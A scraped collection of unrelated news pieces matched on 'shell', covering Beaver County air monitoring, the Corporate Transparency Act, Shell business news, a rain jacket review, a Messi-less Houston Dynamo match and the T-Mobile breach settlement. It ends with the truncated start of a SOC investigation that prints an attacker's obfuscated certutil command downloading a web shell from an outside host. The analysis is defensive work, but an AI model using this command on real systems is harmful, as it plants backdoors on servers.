3/3/25) Data from Project SPOTlight, via Eyes On Air\n\nEyes on Air aims to fill gaps left by existing air monitoring programs in the region, which include Pennsylvania Department of Environmental Protection air monitoring stations in Beaver Falls, Brighton Township, and Hookstown and fenceline monitoring at Shell\u2019s industrial complex. Shell agreed to conduct fenceline air monitoring on its property for certain chemicals linked to health harms in 2017, as part of a lawsuit settlement with environmental advocacy groups. Data from these monitors is publicly available , but it isn\u2019t provided in real time, according to Hoffman.\n\n\u201cThe number one goal when communities do this kind of data collection work is to provide as close to real-time as possible air quality information to the public,\u201d Hoffman said. \u201cThis data offers insights into what you can do hour to hour to protect your health, like when it\u2019s safest to go for a run or let your kids play outside, or when to turn on an air filter at home.\u201d\n\nThe new monitors are located in Beaver, Brighton Township, Center Township, Raccoon Township, and Rochester. In March, BCMAC plans to launch a mobile air monitor for targeted testing of hazardous pollutants like benzene and 1,3-butadiene, which are linked to cancer risk. Residents can sign up to host the monitor on their property for two weeks.

Small businesses are targeted because shell companies, often used to hide illegally obtained assets, tend to have few employees.\n\nTreasury officials, including former Treasury Secretary Janet Yellen, said the regulatory burden would be small, costing about $85 per business, but would offer benefits to law enforcement officials seeking to track down money launderers and other criminals. She said in January 2024 that more than 100,000 businesses had filed beneficial ownership information with Treasury.\n\nThe rule and its legislative authority \u2014 the Corporate Transparency Act, an anti-money laundering statue passed in 2021 \u2014 have been mired in litigation. In 2022, a small business lobbying group sued to block the Treasury Department\u2019s requirement that tens of millions of small businesses register with the government. On Feb. 27, Treasury's Financial Crimes and Enforcement Network said it would not take enforcement actions against companies that do not file beneficial ownership data with the agency.\n\nBusiness leaders cite privacy and security concerns about the database and say it is duplicitous to other government agencies that maintain corporate databases.\n\n\u201cThis is a victory for common sense,\u201d said U.S. Secretary of the Treasury Scott Bessent on Sunday. \u201cToday\u2019s action is part of President Trump\u2019s bold agenda to unleash American prosperity by reining in burdensome regulations, in particular for small businesses that are the backbone of the American economy.\u201d",

The company\u2019s focus on profitability has led to green-energy targets being scaled back.\n\nEarlier this month, subsidiaries Shell Offshore and Shell Pipeline Company agreed to acquire a 15.96% stake in the Ursa platform, pipeline and associated Gulf of Mexico fields from ConocoPhillips for $735m (\u00a3582.55m).",

            "content": "Black Diamond has assembled a solid lineup of quality rain jackets and hardshells over the last several years, and the Fineline (formerly called the StormLine) is yet another standout. By adding stretch into the jacket\u2019s face fabric, BD created an impressively lightweight, weatherproof, durable, and mobile rain shell that pairs well with activities like hiking, biking, and running. After putting the women's Fineline through extensive use in the wet and unrelenting Pacific Northwest, we came away with high praise. Below we outline the Fineline Stretch's performance. To see how it stacks up to the competition, see our articles on the best rain jackets and best women's rain jackets.\n\nEditor's note: We updated this review on March 3, 2025 to swap all in-text references from the StormLine Stretch to the Fineline Stretch Shell. The two designs are largely identical apart from the name change, so we've opted to retain photos from our testing of the StormLine jacket. We will update the review with fresh Fineline photos as soon as possible.\n\n\n\nTable of Contents\n\n\n\nPerformance\n\nWeather Protection\n\nFeaturing Black Diamond\u2019s in-house BD.dry waterproof membrane and backed by a durable water repellent (DWR) finish, the Fineline Stretch Rain Shell is a formidable barrier against rain and wind. Although the jacket has a 2.5-layer construction (as opposed to the 3-layer build typical of pricier hardshells), it\u2019s still impressively weather-worthy. I\u2019ve taken the Fineline as my sole outer layer on numerous backcountry hiking and biking trips in the Pacific Northwest\u2014all of which have included at least one downpour\u2014and it has held up remarkably well while keeping my baselayers dry. Additionally, I\u2019ve experienced no leakage through the zippers. Black Diamond was very thoughtful here: The pit zips are DWR-coated, the front zipper is made with YKK waterproofing, and the hand pocket zippers are covered by generous flaps that prevent water from creeping inside (although these aren\u2019t waterproof).\n\n\n\nThe Fineline's 2.5-layer BD.dry membrane has proven very trustworthy throughout testing | Credit: Brian McCurdy\n\nAnother factor that can heavily impact weather protection is fit. With the Fineline, I found the sleeves to be a good length for protecting my arms and wrists, and by toggling the generous Velcro cuff, I was able to protect my baselayers from getting wet. The jacket also has an elastic drawcord at the hem, which can be pulled tight to seal out moisture. When testing another rain shell earlier in the year, my midlayer grew soaked when rain entered at the wrists and hem. This admittedly was my fault and could have been prevented, but it nevertheless made me partial to jackets with generous, adjustable sleeves and hems\u2014and the Fineline fits that bill nicely.\n\n\n\nThe jacket's generous, adjustable sleeves and hem help maximize wet-weather protection | Credit: Brian McCurdy\n\nThe Black Diamond Fineline Stretch also provides a capable barrier against wind. I wore the jacket while riding my bike over several passes in British Columbia\u2019s Chilcotin mountains\u2014one of which was aptly named \u201cWindy Pass\u201d\u2014and was pleasantly surprised by how skillfully it fended off gusts. In fact, I found it to be a great riding companion for descents where windchill is a constant concern. By the end of the trip, the Fineline had proven itself as a competent and weather-worthy multi-sport jacket.\n\n\n\nThe Fineline is a great match in blustery weather | Credit: Brian McCurdy\n\nComfort and Stretch\n\nThe Fineline's calling card is its stretchy face fabric, which gives the jacket added elasticity and comfort. The bump in freedom of movement is especially great for mobility-dependent activities like hiking, climbing, biking, and running. Black Diamond certainly isn\u2019t the only brand that offers a stretchy rain shell\u2014Outdoor Research offers the Stratoburst Stretch in addition to their pricier and mountain biking-focused Freewheel MTB Stretch, and REI\u2019s Flash Stretch is another relatively affordable (albeit less performance-ready) design. Still, the Fineline remains our favorite in this category for its great overall execution at a competitive weight and price.\n\n\n\nThe Fineline's stretchy face fabric offers a sizable boost in comfort and mobility | Credit: Brian McCurdy\n\nWeight and Packability\n\nAt a listed weight of 9.5 ounces for the women\u2019s model, the Fineline Stretch is one of the lightest fully featured rain jackets on the market. For reference, it\u2019s considerably lighter than REI\u2019s similarly intentioned Flash Stretch (14.5 oz.). It also undercuts leading, non-stretchy designs like the Marmot Minimalist Pertex (11 oz.) and Patagonia Torrentshell 3L (12.4 oz.), although both of those jackets are more everyday-focused and less performance-ready than the Fineline. All things considered, I think Black Diamond did a really nice job balancing weight and features. And when it comes time to stuff it down, the jacket easily stows into its right hand pocket (I also was able to fit it in a bike jersey pocket or small hydration pack), which includes a carabiner-ready loop for clipping to a climbing harness or backpack.\n\n\n\nRunning in the impressively light and packable Fineline Stretch | Credit: Brian McCurdy\n\nBreathability\n\n2.5-layer rain shells typically don\u2019t breathe as well as 3-layer hardshell jackets, and we found this to hold true with the Fineline Stretch. While mountain biking and running with the jacket fully zipped, I struggled to effectively cool off. However, I should note that it was an unseasonably warm and humid summer in the Pacific Northwest. Further, it\u2019s somewhat unrealistic to expect both excellent waterproofing and standout breathability\u2014one often is sacrificed\u2014and especially at this price point. On the bright side, the Fineline features generous pit zips, which work well for dumping heat quickly. If I\u2019m quick to open them when exerting energy, the clamminess quickly dissipates and I can regulate temperature more easily. Finally, the lining inside the jacket is textured and doesn\u2019t feel plasticky (a common complaint we have with rain jackets), but it still is a bit sticky on wet skin. This is especially noticeable when I try to slide damp, bare hands into my pockets.\n\n\n\nThe jacket's interior can grow a little clammy and sticky in warm weather | Credit: Brian McCurdy\n\nFeatures\n\nHood\n\nThe Fineline Stretch features an adjustable, helmet-compatible hood that just works. It easily fits over all of my climbing and mountain bike helmets, and the stretchy fabric adds comfort and a bit of \u201cgive\u201d around the neck. Additionally, the brim is nicely sized and has managed to keep all rain out of my eyes (unless it\u2019s falling at an angle or I\u2019m running/biking into it). Finally, an elastic pull cord at the back of the head allows you to cinch down the hood and secure it in place whether you\u2019re wearing a hat, helmet, or nothing at all underneath.\n\n\n\nA single drawcord at the back of the hood makes it easy to dial in fit | Credit: Brian McCurdy\n\nPockets\n\nBlack Diamond included the standard two zippered hand pockets on the Fineline Stretch Shell but chose to forego a chest pocket. We can understand this decision\u2014the jacket is competitively light as a result (zippers add a good amount of weight), and there\u2019s still enough space for valuables. As I touched on above, both hand pockets feature a generous flap that protects against moisture, and I\u2019m a big fan of being able to stuff the jacket into its own right hand pocket.\n\n\n\nThe Fineline's storage layout comprises two zippered hand pockets but no chest pocket | Credit: Brian McCurdy\n\nBuild Quality and Durability\n\nBecause of its added elasticity, the Black Diamond Fineline feels significantly more tear-resistant than non-stretchy rain jackets. Unfortunately, BD doesn't list the denier (fabric thickness) of the Fineline, but I've had only positive experiences. More specifically, I\u2019ve worn the shell under numerous backpacking packs and have had no delamination or rubbing-related issues. I do tend to stuff the jacket into its pocket before cramming it into my pack or bike bag to help preserve the outer laminate, but it has nevertheless shown zero signs of wear to date. All seams are intact, the zippers are holding up well, and the jacket looks relatively new after extensive testing. All in all, I\u2019m confident that the Fineline will continue to hardily withstand frequent outdoor use.\n\n\n\nThe pliable Fineline feels notably more tear-resistant than non-stretchy designs | Credit: Brian McCurdy\n\nFit and Sizing\n\nI wear a small in most jackets to allow for layering, but an extra small in the Fineline Stretch fit me perfectly. The jacket is by no means bulky, but it is roomy enough to accommodate layers underneath while still being slightly streamlined (BD describes the fit as \u201cregular\u201d). While camping, I often wear several merino baselayers and my Mountain Hardwear Ghost Whisperer down hoody underneath, and even this thick pairing has never felt uncomfortable or restrictive. Further, the longer sleeves are great for biking\u2014when the Velcro is cinched around the cuffs, my baselayers don\u2019t peek out\u2014and the gusseted underarms allow ample mobility. It\u2019s worth noting that my husband tried on the men\u2019s version and found the fit to be notably large and boxy, so I recommend trying on the jacket before buying, if possible.\n\n\n\nBy sizing down, I was able to achieve a flattering but still layering-friendly fit | Credit: Brian McCurdy\n\nSustainability\n\nLike many outdoor brands, Black Diamond has started upping their sustainability focus in recent years. In this case, the Fineline Stretch Shell employs a PFAS-free DWR coating that forgoes per- and polyfluoroalkyl substances\u2014\"forever chemicals\" that are known for their inability to break down over time. With many states stepping up to ban PFAS, we appreciate that most leading outdoor companies have begun turning to eco-friendlier alternatives. It's worth noting that the prior-generation StormLine Stretch also included bluesign-approved materials, and we wish BD had carried those over to the latest Fineline, but we nevertheless appreciate their ongoing efforts.\n\n\n\nThe Fineline is made with a forever chemical-free DWR coating | Credit: Brian McCurdy\n\nOther Versions of the Black Diamond Fineline Stretch\n\nFor this review, I tested the women\u2019s Fineline Stretch Rain Shell, and Black Diamond makes the same jacket in a men\u2019s version. Compared to the women\u2019s, the men\u2019s Fineline Stretch also retails for $180 and features an identical build with two hand pockets (and no chest pocket), pit zips, an adjustable and helmet-compatible hood, and Black Diamond\u2019s proprietary BD.dry waterproofing. Where the two differ is in weight\u2014the men\u2019s jacket checks in at 11.3 ounces versus the women\u2019s 9.5-ounce weight\u2014and color options. If you live in a notoriously wet climate, Black Diamond also sells Fineline Stretch Full Zip Pants ($155) in both women\u2019s and men's styles, which feature the same waterproofing and stretchy fabric.\n\n\n\nTesting the men's FineLine Stretch Shell on a shoulder-season backpacking trip in Wyoming's Wind River Range | Credit: Jason Hummel\n\nWhat We Like\n\nAt 9.5 ounces, the Fineline is one of the lightest fully featured rain jackets on the market.\n\nStretchy shell fabric increases mobility and boosts comfort.\n\nAt $180, the jacket is very reasonably priced for what you get.\n\nFabric isn\u2019t crinkly and loud like traditional Gore-Tex.\n\nNice array of attractive colorways, including seven options for women and eight for men at the time of publishing.\n\n\n\nWhat We Don\u2019t\n\nLike many 2.5-layer rain jackets, the Fineline doesn\u2019t breathe well during high-output activities (although the pit zips are great for dumping heat).\n\nInterior can feel a bit clammy and sticky, which is especially noticeable when stuffing wet hands into the pockets.\n\nNo chest pocket, which is understandable for minimizing weight but limits storage to just the hand pockets.\n\nMen\u2019s version runs slightly large and boxy, which isn\u2019t ideal for backcountry use.\n\n\n\nDespite its low weight, the Fineline comes well equipped for battening down the hatches | Credit: Brian McCurdy\n\nComparison Table\n\n\n\nThe Competition\n\nStretch-infused rain jackets have grown increasingly common in recent years, providing a nice boost in comfort and mobility compared to traditional designs. For a step up in performance, Black Diamond\u2019s own Highline Stretch Shell is another staff favorite. Comparing the two, the Highline uses a more premium 3-layer construction (also BD.dry) that offers better breathability and protection than the Fineline 2.5-layer build. That said, weight goes up slightly to 10.7 ounces, and the Highline doesn\u2019t pack down into a pocket (or even a separate stuff sack) like the Fineline. For a significant $220 less, the Fineline checks all the boxes for most hikers and everyday wearers, although the hardshell-like Highline is more reliable in true alpine conditions (for more, see our in-depth Highline Stretch review).\n\nOutdoor Research also offers an intriguing competitor to the Fineline in their Stratoburst Stretch Rain Jacket. In terms of advantages, the OR is slightly lighter at 8.5 ounces and $15 cheaper without sacrificing backcountry-ready features like pit zips and a water-resistant main zipper. However, the Stratoburst\u2019s hood isn\u2019t helmet-compatible, and we prefer Black Diamond\u2019s slightly wider and more around town-friendly colorway selection (the two-tone versions of the Stratoburst are fairly techy in appearance). In the end, it\u2019s a close call between the two, but we think the BD is the slightly better-balanced piece. If weight is less of a concern, it\u2019s also worth checking out REI\u2019s Flash Stretch Jacket ($169 and 14.5 oz.).\n\n\n\nThe light and packable Fineline is a great match for weight-conscious backpacking trips | Credit: Brian McCurdy\n\nTransitioning to more traditional, non-stretchy rain shells, Marmot\u2019s PreCip Eco is very popular among hikers, backpackers, and everyday users alike. Recently updated with a more premium 3-layer construction (the prior generation was 2.5L like the Fineline), the PreCip retains performance-ready features like pit zips, a stuff pocket, and adjustability at the hood, hem, and cuffs. It\u2019s also competitively lightweight at just 9 ounces and comes in a wide selection of good-looking colorways. However, the Marmot\u2019s fabric flap covering the main zipper adds a noticeable amount of bulk compared to the BD\u2019s water-resistant design, and breathability suffers as a result of the cheaper build. Overall, the Fineline is the more refined performance piece, but the PreCip Eco is an excellent daily driver for a full $60 less.\n\n\n\nEnjoying coffee on a misty morning while wearing the Fineline Stretch | Credit: Brian McCurdy\n\nLast but certainly not least is a longstanding favorite: Patagonia\u2019s Torrentshell 3L Jacket. As its name suggests, the Torrentshell uses a 3-layer build that offers hardshell-like protection, along with plenty of features for battening down the hatches. You also get a thick shell that holds up well even around sharp gear, great everyday-friendly styling, and thoughtful touches like a microfleece lining at the back of the neck and an adjustable hood that stows away when not in use. The biggest drawbacks are comfort and weight: The Patagonia feels noticeably stiff and crinkly compared to the pliable Fineline, and it\u2019s heavier by around 3 ounces. In the end, for mobility-dependent activities like climbing and biking, we prefer the Fineline Stretch. For hiking and daily wear, the Torrentshell is our top pick.",

            "content": "Gutting of Landmark Anti-Money Laundering Law Will Enable Fentanyl Traffickers and Other Criminals\n\nWASHINGTON, DC \u2013 On Sunday, the Treasury Department announced via social media post that it no longer intends to \u201cenforce any penalties or fines against U.S. citizens or domestic reporting companies or their beneficial owners\u201d under the Corporate Transparency Act (CTA). This announcement was followed on Monday by an official Treasury press release, and was echoed by President Trump on his social media platform Truth Social, where he claimed that \u201c(beneficial ownership information) reporting will soon be no more.\u201d\n\nThe CTA \u2013 which requires certain legal entities to provide basic identifying information on their true, or \u201cbeneficial\u201d, owners \u2013 passed with the support of the first Trump Administration and represents the most substantial improvement to the U.S. anti-money laundering framework in a generation.\n\n\u201cWith one tweet, the Administration has contradicted fifteen years of bipartisan work by Congress to end the scourge of anonymous shell companies \u2013 which are a favorite tool of our nation\u2019s global adversaries and criminals including fentanyl traffickers, money launderers, and tax cheats,\u201d said Ian Gary, executive director of the FACT Coalition. \u201cHollowing out the Corporate Transparency Act is an unconstitutional subversion of Congress\u2019 intent that will not survive judicial scrutiny.\u201d\n\n\u201dSmall businesses suffer when they are forced to compete with fraudulent and criminal enterprises that exploit anonymous shell corporations to evade accountability,\u201d said Richard Trent, Executive Director of the small business network Main Street Alliance (MSA). \u201cThe Trump Administration\u2019s reckless efforts to undermine the Corporate Transparency Act\u2019s beneficial ownership reporting requirements threaten to roll back critical protections. Weakening these rules would allow bad actors to continue exploiting loopholes, harming honest small business owners and distorting the marketplace in favor of corruption. That\u2019s why MSA stands firmly in defense of transparency and fairness\u2014because Main Street businesses deserve better.\u201d\n\n\u201cThis decision threatens to make the United States a magnet for foreign criminals, from drug cartels to fraudsters to terrorist organizations,\u201d said Scott Greytak, Director of Advocacy for Transparency International U.S. \u201cInexplicably, it tells foreign criminals\u2013fentanyl traffickers, illegal arms dealers, corrupt foreign officials\u2014that they can evade the most powerful anti-money laundering law passed since the PATRIOT Act by choosing to set up their criminal operations inside the United States.\u201d\n\n\u201cIt is a basic principle that U.S. law enforcement and intelligence agencies should be able to check who is using U.S. shell companies to move money within and across our own borders,\u201d said Nate Sibley fellow and director of Hudson Institute\u2019s Kleptocracy Initiative. \u201cThis action weakens the Trump Administration\u2019s ability to investigate cartel finances and target the profit incentives driving the deadly fentanyl and human trafficking trade across the southern border. Terrorist organizations like Hamas and Hezbollah, as well as major U.S. adversaries like Communist China, also rely on shell companies to conceal activities that threaten American security and prosperity. America\u2019s retreat from leading efforts to uncover these shadowy financial networks is an unforced error that enriches and empowers our worst enemies.\u201d\n\nThe Treasury Department\u2019s sudden announcement contradicted a recent notice on beneficial ownership reporting requirements released by FinCEN just two days earlier. It also runs counter to a recently filed Department of Justice legal brief defending the constitutional power of Congress to enact the CTA, which made clear that \u201cThe absence of company-ownership information in the United States\u2026(is) \u2018mak[ing] the United States a jurisdiction of choice for those wishing to create shell companies\u2019\u201d The move is also a reversal of the strong support of the law by the first Trump administration.\n\nThe timing of the news, coming shortly after DOGE chief Elon Musk promised on the social media website X (formerly Twitter) to \u201clook into\u201d beneficial ownership reporting requirements, additionally raises questions about the Treasury\u2019s independence.\n\nSunday\u2019s unusual and hasty decision against enforcing the CTA must be followed by a more accountable and transparent rulemaking process, offering the public the opportunity to comment. FACT and its members look forward to contributing comments, as it has done in each of the past Treasury rulemakings to implement the CTA. Past comments demonstrate strong support from law enforcement groups, national security experts, and small business associations.\n\nAny future rule that fails to account for public input is subject to invalidation by a court that finds it \u201carbitrary, capricious, an abuse of discretion.\u201d In addition, Treasury\u2019s failure to enforce the law as adopted by Congress and signed into law can be challenged as violating the President\u2019s constitutional duty to \u201ctake care that the laws be faithfully executed.\u201d\n\n###\n\nNotes to the Editor:",

Elizabeth Conley/Houston Chronicle Houston Dynamo fans cheer as their team is announced before taking on Inter Miami at Shell Energy Stadium in Houston on Sunday, March 2, 2025. Elizabeth Conley/Houston Chronicle\n\nThe Houston Dynamo lost 4-1 to Inter Miami CF on Sunday night, remaining winless across their first two games of the MLS regular season. The result paled in comparison to the other disappointment for those attending Shell Energy Stadium.\n\nMiami was without star Lionel Messi for the match after months of anticipation leading up to the fixture. It was to be the Argentine forward\u2019s first appearance in Houston since joining the MLS midseason in 2023. But Messi did not make the trip due to rest after playing Miami\u2019s first three matches of the season.\n\nThe spectacle of hosting Messi, widely regarded as one of the best soccer players of all time, created much excitement for the match. Shell Energy was sold out way before Sunday and the cheapest tickets on resale sites were going for $223 as of Saturday morning. Prices plummeted when news of Messi\u2019s absence arose Saturday afternoon, though the match still drew a recorded 20,810 fans to the stadium.\n\nAdvertisement Article continues below this ad\n\nNot all attendees of the game knew about the truancy before they arrived, however. Kelly, a mother who lives in the Houston area, came with her family as a part of a birthday present for her 11-year-old son who she said is \u201ca big Messi fan.\u201d Neither she, her husband, her daughter or her son knew the star wasn\u2019t playing until the starting lineups were announced.\n\n\u201cHe was literally crying in our seats just now realizing that Messi is not here,\u201d she said. \u201cWe spent a lot of money just to make this dream come true for him, and this is just so disappointing.\u201d\n\nKelly said the family bought the tickets when they first went on sale, springing at the chance for her son to see the superstar in person. She and her husband got their son Messi\u2019s new Miami jersey for the 2025 season in anticipation of the game, which she said added to the family\u2019s costs.\n\n\u201cAs soon as we found out it was Houston versus Miami, it was like \u2018Oh my god they\u2019re coming here. We\u2019ve got to do it for him,\u2019\u201d she said. \u201cWe know that it was his dream to see Messi play.\u201d\n\nOthers got word before coming to the game but experienced the letdown just the same. Brandon Browning, a Katy native now living in Liberty with his family, said he and his 7-year-old son Tyler were in worship team practice at their church when he saw the news on his phone.\n\nAdvertisement Article continues below this ad\n\n\u201cI was like, \u2018You\u2019ve got to be kidding me,\u2019\u201d Browning said of his reaction.\n\nBrowning and his family have been MLS fans for years and frequently watch the Dynamo, Miami and LAFC from home with MLS Season Pass. But he opted to buy Dynamo season tickets this season for the first time when he weighed their cost compared to singular ones for Sunday night\u2019s game. Despite rooting for Houston, both Brandon and Tyler donned pink Messi jerseys as he\u2019s both their favorite player.\n\nThe purchase became the second failed attempt for the two to see the star. Browning said he got tickets for Miami\u2019s Leagues Cup match versus Liga MX side Tigres UANL with hopes to see Messi play when they faced off at NRG Stadium in August 2024. But the forward missed the match after suffering a right ankle injury while playing in the Copa America final for Argentina the month before.\n\nThe two were certainly upset they wouldn\u2019t be seeing the star, but they decided to still attend. Browning said the presence of Miami\u2019s other stars still excited them.\n\n\u201cTen years ago, you would have never thought you\u2019d see Jordi Alba and Luis Su\u00e1rez and Sergio Busquets and Messi, of course, in Houston, Texas,\u201d Browning said. \u201cSeeing all them in person is still a great experience, plus we just like doing this together.\u201d\n\nAdvertisement Article continues below this ad\n\nSuarez, Alba and Busquets all have tenured international careers as well as successful stints alongside Messi at Spanish giant FC Barcelona. All three joined Miami shortly after Messi arrived, eager to reunite with the star.\n\nThe Dynamo took notice of the likely disappointment and acted quickly on it Saturday afternoon. The team announced plans they would reward fans with a free ticket later in the season.\n\n\u201cThe Houston Dynamo are excited to host Inter Miami CF at Shell Energy Stadium on Sunday evening. The recently shared player status report for the match did not include forward Lionel Messi, but it has been reported he did not make the trip to Houston. Unfortunately, we have no control over who plays for our opponent,\u201d the statement read. \u201cWe look forward to hosting everyone (Sunday) for what will be an incredible atmosphere and celebration of soccer for the city of Houston. To show our appreciation, fans who attend (Sunday) night\u2019s match can claim a complimentary ticket to a future Dynamo match this season. Additional details will be provided early next week.\u201d\n\nMiami 4, Houston 1 Miami 3 1 \u2014 4 Houston 0 1 \u2014 1 First Half_1, Miami, Segovia, 2 (Suarez), 6th minute; 2, Miami, Allende, 1 (Suarez), 37th; 3, Miami, Segovia, 3 (Suarez), 45th+2.

They have to rest, I get that.\u201d\n\nKelly, on the other hand, said her family would be taking advantage of the offer. But she hopes it will be for a future match where Messi will be playing in Houston instead of this season. The two teams will not meet again in the regular season in 2025.",

The company is set to distribute $350 million to its customers.\n\nWhat Happened: In 2021, T-Mobile suffered a significant data breach that impacted approximately 76 million people. The breach exposed sensitive data such as names, Social Security numbers, and birth dates. The breach was executed by John Binns, an American hacker based in Turkey, who exploited a misconfigured internet-exposed router to infiltrate T-Mobile\u2019s internal network.\n\nAccording to an update on the T-Mobile Data Breach Settlement website, payments to affected customers are expected to commence in April.\n\nCustomers who incurred out-of-pocket losses could claim up to $25,000, while others may receive $25, or $100 for Californians, with no additional steps required for eligible class members.\n\nAlso Read: TD Bank Confirms Data Breach: Account Numbers and Sensitive Customer Info Exposed\n\nThe compensation is a result of a class-action lawsuit that T-Mobile decided to settle rather than dispute in court. Customers who used T-Mobile in 2021 can reach out to the administrator on the settlement\u2019s website or call 1-833-512-2314 for more information.\n\nWhy It Matters: The data breach has significantly impacted T-Mobile\u2019s reputation and customer trust. The company\u2019s decision to compensate its customers is a crucial step towards rebuilding that trust.\n\nHowever, it also highlights the importance of robust cybersecurity measures in protecting customer data.\n\nThe incident serves as a reminder for other companies to ensure their networks are secure to prevent similar breaches in the future.\n\nRead Next\n\nBank of America's Sensitive Customer Data Compromised in Third-Party Hack \u2013 Is Your Account Safe?",

Elizabeth Conley/Staff Photographer\n\nShell is no longer selling electricity plans to Texas residents, a company spokesperson confirmed to the Houston Chronicle this week.\n\nThe global oil major\u2019s retail energy business, Shell Energy, sold its residential book of customers in the Electric Reliability Council of Texas market to NRG Energy, spokesperson Natalie Gunnell said in an email statement.\n\nShe declined to share when the transaction happened, nor its value. Shell Energy Solutions, a retail electricity business under the Shell Energy umbrella, previously laid off 103 Houston employees in December.\n\nAdvertisement Article continues below this ad\n\n\u201cAs part of our enhanced focus on performance and stronger capital and cost discipline, we will no longer be providing electricity plans for residential customers in the ERCOT market,\u201d Gunnell said.\n\nShell is not selling Shell Energy Solutions, as that business will continue offering electricity products to commercial and industrial customers, Gunnell said. Shell Energy Solutions evolved out of MP2 Energy, a Woodlands-based electric retailer acquired by Shell in 2017.\n\nLOCAL IMPACT: Shell Energy Solutions laid off 100 Houston employees in December\n\nStarting in March, Texas residents who had electricity plans via Shell Energy Solutions will be served by NRG-owned providers Reliant, Discount Power and Cirro Energy, Pat Hammond, NRG\u2019s senior director of communications, said in an email statement.\n\nThe terms of all existing customer contracts will be honored to provide a \u201cseamless, stable transition\u201d from Shell Energy Solutions to NRG\u2019s providers, Hammond said.\n\nAdvertisement Article continues below this ad\n\n\u201cWe are looking forward to welcoming these new customers,\u201d she said.\n\nShell\u2019s exit from its residential retail electricity business in Texas comes as oil and gas companies double down on their core business of extracting fossil fuels, primarily to appease their shareholders concerned about profits. This has coincided with these companies curtailing clean energy ventures and scaling back decarbonization targets.\n\nTHIS WEEK: BP shifts more to oil and gas production in a move to focus less on renewables\n\nShell launched Shell Energy Solutions as its entry into the U.S. power market in 2022 during a different era, when some oil and gas companies were trying to reposition themselves as broader energy providers. At the time, Shell touted its intentions to offer \u201c100% renewable electricity plans\u201d in Texas \u201cto build on our leadership in the energy transition.\u201d\n\nAdvertisement Article continues below this ad\n\n\u201cIn line with this shift to prioritising value over volume in power, we will focus on select markets and segments,\u201d Shell said in a 2024 news release announcing the strategy update.\n\nThe new strategy was expected to lower total growth of Shell\u2019s electricity sales through 2030, which could diminish the company\u2019s ability to reduce climate-warming emissions from its products, according to the news release.\n\nLast month, Shell withdrew from a major New Jersey offshore wind project after President Donald Trump said on Truth Social that he wanted a large-scale wind farm off the coast of southern New Jersey \u201cdead and gone,\u201d Bloomberg reported.",

Inter Miami played three games in the span of 10 days, kicking off the 2025 campaign with the two-legged Concacaf Champions Cup series against Sporting Kansas City and the MLS opener versus New York City FC.\n\nA club source confirmed Messi is not injured, and projected to play against Jamaican side Cavalier FC in the Concacaf Champions Cup first-leg match on Thursday at Chase Stadium.\n\nIn a statement later on Saturday, Houston said fans who attended Sunday's game would be offered a complimentary ticket to another match.\n\n\"The Houston Dynamo are excited to host Inter Miami CF at Shell Energy Stadium on Sunday evening,\" the statement read. \"The recently shared player status report for the match did not include forward Lionel Messi, but it has been reported he did not make the trip to Houston. Unfortunately, we have no control over who plays for our opponent.\n\n\"We look forward to hosting everyone tomorrow for what will be an incredible atmosphere and celebration of soccer for the city of Houston. To show our appreciation, fans who attend tomorrow night's match can claim a complimentary ticket to a future Dynamo match this season. Additional details will be provided early next week.\"\n\nMessi's absence from the trip was first reported by the Miami Herald.\n\nThe news comes after Mascherano said Friday that the 37-year-old trained with teammates and would be available for selection this weekend.\n\n\"Leo is fine. He is normal and he will train normally like all his teammates,\" Mascherano said.\n\nThe coach did go on to reveal he would rest the player when the time was right, given the heavy schedule throughout the 2025 season.\n\n\"Look, there are not two equal situations. And we have to put everything in context. We played in a knockout round. We started the season in Kansas, where the Champions League is an important competition for us,\" Mascherano said.\n\n\"We also had the start of the MLS between the two games of the series. It is one of the competitions where we aim to compete and reach the highest possible. When we talk about being able to rotate or dose the players, we must see the context. The context is that we had to play three games in six days.\n\n\"We didn't have the rest that we had to have before, because we were changed on the first match date. It is what it is, we adapt to the circumstances. We couldn't modify anything. We asked to modify it and we couldn't. Beyond that, obviously we have to try to take care of the players. When we find the right time to rest, we will rest. We will move forward.\"\n\nInter Miami visits the Dynamo for the second match day of the 2025 MLS season. The team currently boasts two wins and one draw under Mascherano.",

Kerkez fits the profile of a young, dynamic full-back who could provide long-term stability.\n\nHowever, acquiring him will not be an easy task. Bournemouth are well aware of the talent they have and are in no rush to sell him.\n\nAccording to Fichajes, the Premier League side have set an asking price of at least \u20ac40 million, which reflects his growing importance in the squad.\n\nFor Real Madrid, the coming weeks will be crucial in deciding whether to make a move for the Hungarian defender.\n\nThe club is known for making calculated decisions in the transfer market, and they must weigh whether investing such a significant amount in Kerkez is the right move.",

            "content": "Web shells have evolved far beyond their original purpose of basic remote command execution, and many now function more like lightweight exploitation frameworks. These tools often include features such as in-memory module execution and encrypted command-and-control (C2) communication, giving attackers flexibility while minimizing their footprint.\n\nThis article walks through a SOC investigation where efficient surface-level analysis led to the identification of a web shell associated with a well-known toolset commonly associated with Chinese-speaking threat actors. Despite being a much-discussed tool, it is still used by the attackers for post-exploitation activities, thanks to its modular design and adaptability. We\u2019ll break down the investigative process, detail how the analysts uncovered the web shell family, and highlight practical detection strategies to help defenders identify similar threats.\n\nOnset\n\nIt\u2019s early Monday morning, almost 4am UTC time, and the apparent nighttime calm inside the SOC is abruptly interrupted by an alert from our SIEM. It indicates that Kaspersky Endpoint Security\u2019s heuristic engine has detected a web shell ( HEUR:Backdoor.MSIL.WebShell.gen ) on the SharePoint server of a government infrastructure in Southeast Asia, a warning that no SOC analyst would want to ignore.\n\nC:\\Windows\\System32\\inetsrv\\w3wp.exe -ap \"SharePoint\" [...] \u2514\u2500\u2500 \"cmd.exe\" /c cd /d \"[REDACTED]\"&,;;;,@cer^t^u^t^il -u\"\"\"\"r\"\"\"\"l\"\"\"\"c\"\"\"\"a\"\"\"\"c\"\"\"\"h\"\"\"\"e\"\"\"\" -split -f hxxps://bashupload[.]com/[REDACTED]/404.aspx 404.aspx \u2514\u2500\u2500 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\[REDACTED]\\[REDACTED]\\App_Web_404.aspx.[REDACTED].[REDACTED].dll 1 2 3 C : \\ Windows \\ System32 \\ inetsrv \\ w3wp . exe - ap \"SharePoint\" [ . . . ] \u2514\u2500\u2500 \"cmd.exe\" / c cd / d \"[REDACTED]\" &,; ; ; , @ cer ^ t ^ u ^ t ^ il - u \"\" \"\" r \"\" \"\" l \"\" \"\" c \"\" \"\" a \"\" \"\" c \"\" \"\" h \"\" \"\" e \"\" \"\" - split - f hxxps : //bashupload[.]com/[REDACTED]/404.aspx 404.aspx \u2514\u2500\u2500 C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0.30319 \\ Temporary ASP . NET Files \\ root \\ 